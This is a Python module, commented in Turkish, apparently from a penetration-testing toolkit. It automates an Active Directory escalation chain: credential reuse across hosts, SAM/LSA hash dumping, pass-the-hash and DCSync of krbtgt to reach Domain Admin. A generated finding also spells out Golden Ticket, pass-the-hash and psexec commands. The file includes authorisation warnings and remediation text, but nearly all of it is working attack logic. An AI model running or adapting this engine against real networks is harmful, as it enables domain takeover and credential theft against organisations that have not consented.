"""Otonom yetki yükseltme motoru — "kimlikten Domain Admin'e".

Eldeki kimliklerle (spray/seed/gMSA/LAPS) başlar ve KİLİTLENME RİSKİ OLMADAN
(doğru kimlikle giriş başarısız-sayacı artırmaz) şu turlu zinciri yürütür:

    [tur] reuse (host'larda dene)  ->  admin host'ta secrets dump (--sam/--lsa)
          ->  yeni NT hash'ler  ->  (sonraki tur) pass-the-hash
          ->  DC'de DCSync (--ntds)  ->  krbtgt  ->  DOMAIN ADMIN

Her tur yeni kimlik bulundukça ilerler; yeni kimlik yoksa ya da DA'ya ulaşılınca
durur (en çok MAX_ROUNDS tur — sonsuz döngü yok). Aktif kimlik doğrulaması
yaptığından yalnızca onaylı/izinli ortamda çalışır; --auto bunu çağırır.

dry-run: hiçbir şey çalıştırmaz, yalnızca ilk turun komut planını gösterir.
"""

from __future__ import annotations

import re

from .findings import Credential, Finding, ScanReport, Severity
from .modules import nxc_scan
from .registry import ScanContext
from .runner import run, strip_dryrun

MAX_ROUNDS = 3

# nxc çok-hedefli başarı satırı: "SMB  10.0.0.5  445  WS01  [+] dom\\user:secret (Pwn3d!)"
_HIT_RX = re.compile(
    r"^(?:SMB|WINRM|RDP)\s+(\S+)\s+\d+\s+(\S+)\s+\[\+\]\s+"
    r"(?:([^\s\\]+)\\)?([^\s:]+):(\S+?)(\s+\(Pwn3d!\))?\s*$",
    re.MULTILINE,
)
# secretsdump / --sam / --lsa / --ntds hash satırı: user:rid:lm:nt:::
_HASH_RX = re.compile(r"^([^\s:]+):(\d+):[0-9a-f]{32}:([0-9a-f]{32}):::", re.MULTILINE)


def _cid(c: Credential) -> tuple:
    return (c.domain.lower(), c.username.lower(), c.secret)


def _auth(c: Credential) -> list[str]:
    # nxc: kullanıcı adı -u'da OLDUĞU GİBİ, domain AYRI -d ile verilir.
    # ('DOMAIN\user' biçimini -u'ya gömmek NetExec'te auth'u bozar.)
    argv = ["-u", c.username]
    if c.domain:
        argv += ["-d", c.domain]
    if c.kind == "nthash":
        return argv + ["-H", c.secret]
    return argv + ["-p", c.secret]


def _say(ui, text: str) -> None:
    if ui is not None:
        ui.log(text)
    else:
        print(text)


def _dc_ip(ctx: ScanContext) -> str:
    """Hedeften DC IP'sini türetir (CIDR/liste verildiyse ilkini al)."""
    return ctx.target.split(",")[0].split("/")[0].strip()


# ---------------------------------------------------------------------------
# Tur adımları
# ---------------------------------------------------------------------------

def _reuse(bin_name, creds, targets, ctx, report, ui):
    """Kimlikleri host'larda dener; (host, cred, is_dc) admin isabetlerini döndürür."""
    dc_ip = _dc_ip(ctx)
    admin_hits: list[tuple[str, Credential, bool]] = []
    for c in creds:
        argv = [bin_name, "smb", targets] + _auth(c) + ["--continue-on-success"]
        res = run(argv, tool=f"escalate:reuse:{c.username}",
                  timeout=ctx.timeout, dry_run=ctx.dry_run)
        out = strip_dryrun(res.combined)
        for m in _HIT_RX.finditer(out):
            host, _name, dom, user, secret, pwn = m.groups()
            is_admin = bool(pwn)
            report.add_credential(Credential(
                username=user, secret=secret,
                kind="nthash" if re.fullmatch(r"[0-9a-f]{32}", secret) else "password",
                domain=dom or c.domain, source="escalate", host=host, admin=is_admin))
            if is_admin:
                is_dc = host == dc_ip or (report.dc_name
                                          and report.dc_name.lower() in _name.lower())
                admin_hits.append((host, c, is_dc))
                _say(ui, f"    {_mark('✔', ui)} yerel admin: {host}  ({c.username})"
                         + ("  [DC!]" if is_dc else ""))
    return admin_hits


def _dump_local(bin_name, cred, host, ctx, report, ui):
    """Admin olunan (DC olmayan) host'ta SAM+LSA döker; yeni hash'leri kimliğe çevirir."""
    argv = [bin_name, "smb", host] + _auth(cred) + ["--sam", "--lsa"]
    res = run(argv, tool=f"escalate:dump:{host}", timeout=ctx.timeout, dry_run=ctx.dry_run)
    new = _ingest_hashes(strip_dryrun(res.combined), report, host, source="secretsdump")
    if new:
        _say(ui, f"    {_mark('+', ui)} {host}: {new} yeni hash (SAM/LSA) → sonraki tur")


def _dcsync(bin_name, cred, dc_ip, ctx, report, ui):
    """DC'de DCSync (--ntds) dener; krbtgt düşerse DOMAIN ADMIN ilan edilir."""
    argv = [bin_name, "smb", dc_ip] + _auth(cred) + ["--ntds"]
    res = run(argv, tool=f"escalate:dcsync:{dc_ip}", timeout=ctx.timeout, dry_run=ctx.dry_run)
    out = strip_dryrun(res.combined)
    n = _ingest_hashes(out, report, dc_ip, source="dcsync")
    if re.search(r"\bkrbtgt:", out, re.IGNORECASE) or (n and "krbtgt" in out.lower()):
        _declare_da(report, cred, dc_ip, out, ui)
        return True
    return False


# ---------------------------------------------------------------------------
# Yardımcılar
# ---------------------------------------------------------------------------

def _ingest_hashes(text, report, host, *, source) -> int:
    """Hash dökümü satırlarından (user:rid:lm:nt:::) kimlik üretir; sayısını döndürür."""
    added = 0
    for m in _HASH_RX.finditer(text):
        user, _rid, nt = m.group(1), m.group(2), m.group(3)
        if user.endswith("$"):
            continue
        before = len(report.credentials)
        report.add_credential(Credential(
            username=user, secret=nt, kind="nthash",
            domain=report.domain, source=source, host=host))
        if len(report.credentials) > before:
            added += 1
    return added


def _best_admin_cred(report) -> Credential | None:
    """DCSync denemesi için en umutlu admin kimliğini seçer."""
    admins = [c for c in report.credentials if c.admin]
    # DA adayı: adı 'admin' geçen ya da nthash (makine/servis) olanı önceliklendir
    admins.sort(key=lambda c: ("admin" not in c.username.lower(), c.kind != "nthash"))
    return admins[0] if admins else None


def _declare_da(report, cred, dc_ip, out, ui) -> None:
    if report.domain_admin:
        return
    report.domain_admin = True
    report.add(Finding(
        title="DOMAIN ADMIN — DCSync ile krbtgt/domain hash'leri elde edildi",
        severity=Severity.CRITICAL, target=dc_ip, source="escalate",
        description="Otonom yükseltme zinciri Domain Admin yetkisine ulaştı: DC üzerinde "
                    "DCSync ile krbtgt dahil tüm domain hash'leri döküldü. Domain tamamen "
                    "ele geçirildi.",
        evidence=_grep_krbtgt(out),
        remediation="krbtgt parolasını İKİ KEZ sıfırlayın; ele geçirmeyi olay müdahalesine "
                    "alın; tiered admin + LAPS + saldırı yüzeyi azaltma uygulayın.",
        reference="DCSync / krbtgt / Golden Ticket",
        poc=f"nxc smb {dc_ip} -u {cred.username} "
            + ("-H <nthash>" if cred.kind == "nthash" else "-p <pass>")
            + " --ntds   # ya da: secretsdump.py <domain>/"
              f"{cred.username}@{dc_ip} -just-dc",
        escalation=(
            "Domain tamamen ele geçirildi — kalıcılık ve tam kontrol:\n"
            "1) Golden Ticket (krbtgt ile sınırsız TGT):\n"
            "   ticketer.py -nthash <krbtgt_nt> -domain-sid <SID> -domain <domain> Administrator\n"
            "   export KRB5CCNAME=Administrator.ccache\n"
            "2) Herhangi bir hesaba pass-the-hash: nxc smb <host> -u <user> -H <nt> -x whoami\n"
            "3) DA kimliğiyle her host'a psexec/wmiexec; DCSync tüm hash'leri verdi\n"
            "4) Müdahale: krbtgt'yi İKİ KEZ sıfırla (golden ticket'ları geçersiz kılar).")))
    _say(ui, f"  {_mark('★', ui)} DOMAIN ADMIN ELDE EDİLDİ — krbtgt düştü ({dc_ip})")


def _grep_krbtgt(out: str) -> str:
    from .config import REDACT
    lines = [ln for ln in out.splitlines() if re.match(r"^[^\s:]+:\d+:[0-9a-f]{32}:", ln)]
    if REDACT:
        return f"({len(lines)} hesap hash'i döküldü — --redact ile gizlendi)"
    return "\n".join(lines[:40])


def _mark(sym: str, ui) -> str:
    color = getattr(ui, "color", False)
    if not color:
        return sym
    hot = {"★": "\033[1;97;41m", "✔": "\033[1;32m", "+": "\033[1;36m"}.get(sym, "")
    return f"{hot}{sym}\033[0m" if hot else sym


# ---------------------------------------------------------------------------
# Motor
# ---------------------------------------------------------------------------

def run_to_da(ctx: ScanContext, report: ScanReport, *, ui=None) -> bool:
    """Kimliklerden Domain Admin'e ulaşmaya çalışır. DA'ya ulaşıldıysa True döner."""
    bin_name = nxc_scan.tool().name
    targets = ctx.reuse_targets or (",".join(report.hosts) if report.hosts else ctx.target)
    dc_ip = _dc_ip(ctx)

    if not any(c.secret for c in report.credentials):
        _say(ui, "  (escalate: denenecek kimlik yok — spray/seed kimlik gerekli)")
        return False

    if ctx.dry_run:
        _say(ui, "  [PLAN] Yükseltme zinciri (çalıştırılmadı):")
        sample = next((c for c in report.credentials if c.secret), None)
        if sample:
            _reuse(bin_name, [sample], targets, ctx, report, ui)
            _dcsync(bin_name, sample, dc_ip, ctx, report, ui)
        _say(ui, "  Gerçek çalıştırma: --auto (onay gerekir).")
        return False

    tried_creds: set = set()
    dumped_hosts: set = set()
    tried_dcsync: set = set()
    round_no = 0
    while round_no < MAX_ROUNDS and not report.domain_admin:
        round_no += 1
        creds = [c for c in report.credentials
                 if c.secret and _cid(c) not in tried_creds]
        if not creds:
            break
        _say(ui, f"  {_mark('✔', ui)} Tur {round_no}/{MAX_ROUNDS}: "
                 f"{len(creds)} kimlik × host'lar deneniyor")
        for c in creds:
            tried_creds.add(_cid(c))

        admin_hits = _reuse(bin_name, creds, targets, ctx, report, ui)

        # Admin host'larda döküm: DC ise DCSync, değilse SAM/LSA
        for host, cred, is_dc in admin_hits:
            if host in dumped_hosts:
                continue
            dumped_hosts.add(host)
            if is_dc:
                _dcsync(bin_name, cred, host, ctx, report, ui)
            else:
                _dump_local(bin_name, cred, host, ctx, report, ui)

        # DC doğrudan Pwn3d olmasa da eldeki en iyi admin kimliğiyle DCSync dene
        if not report.domain_admin:
            best = _best_admin_cred(report)
            if best and _cid(best) not in tried_dcsync:
                tried_dcsync.add(_cid(best))
                _dcsync(bin_name, best, dc_ip, ctx, report, ui)

    if report.domain_admin:
        _say(ui, f"  {_mark('★', ui)} Sonuç: DOMAIN ADMIN ({round_no} turda)")
    else:
        _say(ui, f"  Sonuç: DA'ya ulaşılamadı ({round_no} tur denendi). "
                 "Eldeki kimliklerle yanal hareket raporlandı.")
    return report.domain_admin
